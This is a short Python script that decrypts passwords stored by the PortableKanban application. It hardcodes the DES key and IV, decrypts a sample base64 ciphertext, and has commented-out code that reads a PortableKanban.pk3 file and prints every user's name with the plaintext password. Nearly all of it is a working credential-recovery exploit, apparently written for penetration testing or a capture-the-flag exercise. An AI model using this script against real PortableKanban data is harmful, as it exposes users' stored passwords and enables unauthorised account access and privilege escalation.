import json
import base64
from des import * #python3 -m pip install des
import sys

# try:
# 	path = sys.argv[1]
# except:
# 	exit("Supply path to PortableKanban.pk3 as argv1")

def decode(hash):
	hash = base64.b64decode(hash.encode('utf-8'))
	key = DesKey(b"7ly6UznJ")
	return key.decrypt(hash,initial=b"XuVUm5fR",padding=True).decode('utf-8')

print(decode('Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi'))

# with open(path) as f:
# 	try:
# 		data = json.load(f)
# 	except: #Start of file sometimes contains junk - this automatically seeks valid JSON
# 		broken = True
# 		i = 1
# 		while broken:
# 			f.seek(i,0)
# 			try:
# 				data = json.load(f)
# 				broken = False
# 			except:
# 				i+= 1


# for user in data["Users"]:
# 	print("{}:{}".format(user["Name"],decode(user["EncryptedPassword"])))
